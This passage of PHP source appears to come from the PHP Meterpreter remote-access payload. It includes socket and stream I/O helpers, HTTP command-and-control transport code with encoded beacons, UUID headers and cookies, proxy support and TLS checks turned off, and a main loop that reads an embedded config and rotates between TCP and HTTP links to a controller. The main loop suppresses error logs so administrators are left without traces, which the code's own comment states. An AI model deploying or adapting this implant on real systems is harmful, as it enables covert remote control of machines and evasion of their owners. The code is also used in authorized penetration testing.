    # Unfortunately, selecting on pipes created with proc_open on Windows
    # always returns immediately.  Basically, shell interaction in Windows
    # is hosed until this gets figured out.
    #
    # From the documentation:
    # > Use of stream_select() on file descriptors returned by proc_open()
    #   will fail and return FALSE under Windows.
    $r = Array($resource);
    my_print("Calling select to see if there's data on $resource");
    $last_requested_len = 0;
    while (true) {
      $w=NULL;$e=NULL;$t=0;
      $cnt = stream_select($r, $w, $e, $t);

      # Stream is not ready to read, have to live with what we've gotten
      # so far
      if ($cnt === 0) {
        break;
      }

      # if stream_select returned false, something is wrong with the
      # socket or the syscall was interrupted or something.
      if ($cnt === false or feof($resource)) {
        my_print("Checking for failed read...");
        if (empty($buff)) {
          my_print("----  EOF ON $resource  ----");
          $buff = false;
        }
        break;
      }

      $md = stream_get_meta_data($resource);
      dump_array($md, "Metadata for {$resource}");
      if ($md['unread_bytes'] > 0) {
        $last_requested_len = min($len, $md['unread_bytes']);
        $buff .= fread($resource, $last_requested_len);
        break;
      } else {
        $tmp = fread($resource, $len);
        $last_requested_len = $len;
        $buff .= $tmp;
        if (strlen($tmp) < $len) {
          break;
        }
      }

      if ($resource != $msgsock) { my_print("buff: '$buff'"); }
      $r = Array($resource);
    }
    my_print(sprintf("Done with the big read loop on $resource, got %d bytes, asked for %d bytes", strlen($buff), $last_requested_len));
    break;
  default:
    # then this is possibly a closed channel resource, see if we have any
    # data from previous reads
    $cid = get_channel_id_from_resource($resource);
    $c = get_channel_by_id($cid);
    if ($c and $c['data']) {
      $buff = substr($c['data'], 0, $len);
      $c['data'] = substr($c['data'], $len);
      my_print("Aha!  got some leftovers");
    } else {
      my_print("Wtf don't know how to read from resource $resource, c: $c");
      if (is_array($c)) {
        dump_array($c);
      }
      break;
    }
  }
  my_print(sprintf("Read %d bytes", strlen($buff)));
  return $buff;
}

function write($resource, $buff, $len=0) {
  global $udp_host_map;
  if ($len == 0) { $len = strlen($buff); }
  #my_print(sprintf("Writing $len bytes to $resource which is a %s", get_rtype($resource)));
  $count = false;
  switch (get_rtype($resource)) {
  case 'socket':
    if (array_key_exists((int)$resource, $udp_host_map)) {
      my_print("Writing UDP socket");
      list($host,$port) = $udp_host_map[(int)$resource];
      $count = socket_sendto($resource, $buff, $len, $host, $port);
    } else {
      $count = socket_write($resource, $buff, $len);
    }
    break;
  case 'stream':
    $count = fwrite($resource, $buff, $len);
    fflush($resource);
    break;
  default: my_print("Wtf don't know how to write to resource $resource"); break;
  }
  return $count;
}

function get_rtype($resource) {
  global $resource_type_map;
  if (array_key_exists((int)$resource, $resource_type_map)) {
    return $resource_type_map[(int)$resource];
  }
  return false;
}

function select(&$r, &$w, &$e, $tv_sec=0, $tv_usec=0) {
  $streams_r = array();
  $streams_w = array();
  $streams_e = array();

  $sockets_r = array();
  $sockets_w = array();
  $sockets_e = array();

  if ($r) {
    foreach ($r as $resource) {
      switch (get_rtype($resource)) {
      case 'socket': $sockets_r[] = $resource; break;
      case 'stream': $streams_r[] = $resource; break;
      default: my_print("Unknown resource type"); break;
      }
    }
  }
  if ($w) {
    foreach ($w as $resource) {
      switch (get_rtype($resource)) {
      case 'socket': $sockets_w[] = $resource; break;
      case 'stream': $streams_w[] = $resource; break;
      default: my_print("Unknown resource type"); break;
      }
    }
  }
  if ($e) {
    foreach ($e as $resource) {
      switch (get_rtype($resource)) {
      case 'socket': $sockets_e[] = $resource; break;
      case 'stream': $streams_e[] = $resource; break;
      default: my_print("Unknown resource type"); break;
      }
    }
  }

  $n_sockets = count($sockets_r) + count($sockets_w) + count($sockets_e);
  $n_streams = count($streams_r) + count($streams_w) + count($streams_e);
  #my_print("Selecting $n_sockets sockets and $n_streams streams with timeout $tv_sec.$tv_usec");
  $r = array();
  $w = array();
  $e = array();

  # Workaround for some versions of PHP that throw an error and bail out if
  # select is given an empty array
  if (count($sockets_r)==0) { $sockets_r = null; }
  if (count($sockets_w)==0) { $sockets_w = null; }
  if (count($sockets_e)==0) { $sockets_e = null; }
  if (count($streams_r)==0) { $streams_r = null; }
  if (count($streams_w)==0) { $streams_w = null; }
  if (count($streams_e)==0) { $streams_e = null; }

  $count = 0;
  if ($n_sockets > 0) {
    $res = socket_select($sockets_r, $sockets_w, $sockets_e, $tv_sec, $tv_usec);
    if (false === $res) { return false; }
    if (is_array($r) && is_array($sockets_r)) { $r = array_merge($r, $sockets_r); }
    if (is_array($w) && is_array($sockets_w)) { $w = array_merge($w, $sockets_w); }
    if (is_array($e) && is_array($sockets_e)) { $e = array_merge($e, $sockets_e); }
    $count += $res;
  }
  if ($n_streams > 0) {
    $res = stream_select($streams_r, $streams_w, $streams_e, $tv_sec, $tv_usec);
    if (false === $res) { return false; }
    if (is_array($r) && is_array($streams_r)) { $r = array_merge($r, $streams_r); }
    if (is_array($w) && is_array($streams_w)) { $w = array_merge($w, $streams_w); }
    if (is_array($e) && is_array($streams_e)) { $e = array_merge($e, $streams_e); }
    $count += $res;
  }
  #my_print(sprintf("total: $count, Modified counts: r=%s w=%s e=%s", count($r), count($w), count($e)));
  return $count;
}

function add_reader($resource) {
  global $readers;
  if (is_resource($resource) && !in_array($resource, $readers)) {
    $readers[] = $resource;
  }
}

function remove_reader($resource) {
  global $readers;
  #my_print("Removing reader: $resource");
  #dump_readers();
  if (in_array($resource, $readers)) {
    foreach ($readers as $key => $r) {
      if ($r == $resource) {
        unset($readers[$key]);
      }
    }
  }
}


##
# HTTP Transport Functions
##

function c2_encode($data, $enc) {
  if ($enc == C2_ENCODING_B64) {
    return base64_encode($data);
  } elseif ($enc == C2_ENCODING_B64URL) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
  }
  return $data;
}

function c2_decode($data, $enc) {
  if ($enc == C2_ENCODING_B64) {
    return base64_decode($data);
  } elseif ($enc == C2_ENCODING_B64URL) {
    return base64_decode(strtr($data, '-_', '+/'));
  }
  return $data;
}

function http_get_uuid_from_url($url) {
  $path = parse_url($url, PHP_URL_PATH);
  if ($path === null || strlen($path) <= 1) { return ''; }
  $path = trim($path, '/');
  $parts = explode('/', $path);
  return end($parts);
}

function http_transport_uuid($transport) {
  # Prefer TLV_TYPE_C2_UUID; fall back to URL path's last segment.
  if (!empty($transport['c2_uuid'])) {
    return $transport['c2_uuid'];
  }
  return http_get_uuid_from_url($transport['url']);
}

function http_build_profile_url($transport, $profile) {
  $base_url = $transport['url'];
  if ($profile == null || !isset($profile['uri']) || $profile['uri'] == null) {
    return $base_url;
  }
  $parsed = parse_url($base_url);
  $url = $parsed['scheme'] . '://' . $parsed['host'];
  if (isset($parsed['port'])) { $url .= ':' . $parsed['port']; }
  $uri = $profile['uri'];
  if ($uri[0] != '/') { $uri = '/' . $uri; }
  $url .= $uri;

  if (isset($profile['uuid_get']) && $profile['uuid_get'] != null) {
    $uuid = http_transport_uuid($transport);
    if (strlen($uuid) > 0) {
      $sep = (strpos($url, '?') !== false) ? '&' : '?';
      $url .= $sep . $profile['uuid_get'] . '=' . $uuid;
    }
  }
  return $url;
}

function http_build_context($transport, $profile, $body = null) {
  $headers = "Content-Type: application/octet-stream\r\n";
  if (isset($transport['ua']) && $transport['ua'] != null) {
    $headers .= "User-Agent: " . $transport['ua'] . "\r\n";
  }
  if (isset($transport['custom_headers']) && $transport['custom_headers'] != null) {
    $headers .= $transport['custom_headers'] . "\r\n";
  }
  if ($profile != null) {
    if (isset($profile['uuid_header']) && $profile['uuid_header'] != null) {
      $uuid = http_transport_uuid($transport);
      if (strlen($uuid) > 0) {
        $headers .= $profile['uuid_header'] . ': ' . $uuid . "\r\n";
      }
    }
    if (isset($profile['uuid_cookie']) && $profile['uuid_cookie'] != null) {
      $uuid = http_transport_uuid($transport);
      if (strlen($uuid) > 0) {
        $headers .= "Cookie: " . $profile['uuid_cookie'] . '=' . $uuid . "\r\n";
      }
    }
  }

  $opts = array('http' => array(
    'method' => ($body !== null) ? 'POST' : 'GET',
    'header' => $headers,
    'timeout' => $transport['comm_timeout'],
    'ignore_errors' => true,
  ));
  if ($body !== null) {
    $opts['http']['content'] = $body;
  }

  if (isset($transport['proxy_url']) && $transport['proxy_url'] != null) {
    $opts['http']['proxy'] = $transport['proxy_url'];
    $opts['http']['request_fulluri'] = true;
    if (!empty($transport['proxy_user'])) {
      $pass = isset($transport['proxy_pass']) ? $transport['proxy_pass'] : '';
      $auth = base64_encode($transport['proxy_user'] . ':' . $pass);
      $opts['http']['header'] .= "Proxy-Authorization: Basic " . $auth . "\r\n";
    }
  }

  if (strpos($transport['url'], 'https') === 0) {
    $opts['ssl'] = array(
      'verify_peer' => false,
      'verify_peer_name' => false,
      'allow_self_signed' => true,
    );
  }

  return stream_context_create($opts);
}

function http_get_packet($transport) {
  $profile = $transport['c2_get'];
  $url = http_build_profile_url($transport, $profile);
  $ctx = http_build_context($transport, $profile);

  $raw = @file_get_contents($url, false, $ctx);
  if ($raw === false || strlen($raw) == 0) {
    return null;
  }

  if ($profile != null) {
    $start = $profile['prefix_skip'];
    $end = strlen($raw) - $profile['suffix_skip'];
    if ($start > 0 || $profile['suffix_skip'] > 0) {
      $raw = substr($raw, $start, $end - $start);
    }
    $raw = c2_decode($raw, $profile['enc']);
  }

  return $raw;
}

function http_send_packet($transport, $packet) {
  $profile = $transport['c2_post'];
  $body = $packet;

  if ($profile != null) {
    $body = c2_encode($body, $profile['enc']);
    $prefix = isset($profile['prefix']) ? $profile['prefix'] : '';
    $suffix = isset($profile['suffix']) ? $profile['suffix'] : '';
    if (strlen($prefix) > 0 || strlen($suffix) > 0) {
      $body = $prefix . $body . $suffix;
    }
  }

  $url = http_build_profile_url($transport, $profile);
  $ctx = http_build_context($transport, $profile, $body);

  @file_get_contents($url, false, $ctx);
}

##
# Main stuff
##

ob_implicit_flush();

# Turn off error reporting so we don't leave any ugly logs.  Why make an
# administrator's job easier if we don't have to?  =)
if (my_debugging_enabled()) {
  error_reporting(E_ALL);
} else {
  error_reporting(0);
}

@ignore_user_abort(true);
# Has no effect in safe mode, but try anyway
@set_time_limit(0);
@ignore_user_abort(1);
@ini_set('max_execution_time',0);

# Parse configuration from TLV config block
$config = parse_config_block(base64_decode(CONFIG_BLOCK));

$GLOBALS['UUID'] = $config['uuid'];
$GLOBALS['SESSION_GUID'] = $config['session_guid'];
$GLOBALS['AES_KEY'] = $config['sym_key'];
$GLOBALS['AES_ENABLED'] = false;

if ($config['debug_log'] != null && strlen($config['debug_log']) > 0) {
  # TLV-supplied debug log path overrides the compile-time MY_DEBUGGING_LOG_FILE_PATH
  $GLOBALS['DEBUGGING'] = true;
  $GLOBALS['DEBUGGING_LOG_FILE_PATH'] = $config['debug_log'];
  my_print("Debug log path: " . $config['debug_log']);
}

$GLOBALS['transport_list'] = $config['transports'];
$GLOBALS['current_transport_idx'] = 0;
$GLOBALS['next_transport_idx'] = null;
$GLOBALS['session_expiry_end'] = time() + $config['session_expiry'];
$GLOBALS['running'] = true;

#
# Outer transport-rotation loop: activate the current transport (with retry),
# dispatch on it, then rotate forward or switch as directed.
#
while ($GLOBALS['running'] && time() < $GLOBALS['session_expiry_end']) {
  $idx = $GLOBALS['current_transport_idx'];
  $transport = &$GLOBALS['transport_list'][$idx];

  if (!activate_transport_with_retry($transport)) {
    my_print("Failed to activate transport[$idx], rotating");
    $GLOBALS['current_transport_idx'] = transport_next_idx($idx);
    unset($transport);
    continue;
  }

  if ($transport['type'] == 'tcp') {
    $result = dispatch_tcp($transport);
    my_print("Finished TCP transport");
  } else {
    $result = dispatch_http($transport);
    my_print("Finished HTTP transport");
  }

  if ($result == DISPATCH_EXIT) {
    unset($transport);
    break;
  }
  if ($result == DISPATCH_SWITCH) {
    $GLOBALS['current_transport_idx'] = $GLOBALS['next_transport_idx'];
    $GLOBALS['next_transport_idx'] = null;
  } else {
    # DISPATCH_RETIRE: rotate forward
    $GLOBALS['current_transport_idx'] = transport_next_idx($idx);
  }
  unset($transport);
}
my_print("--------------------");
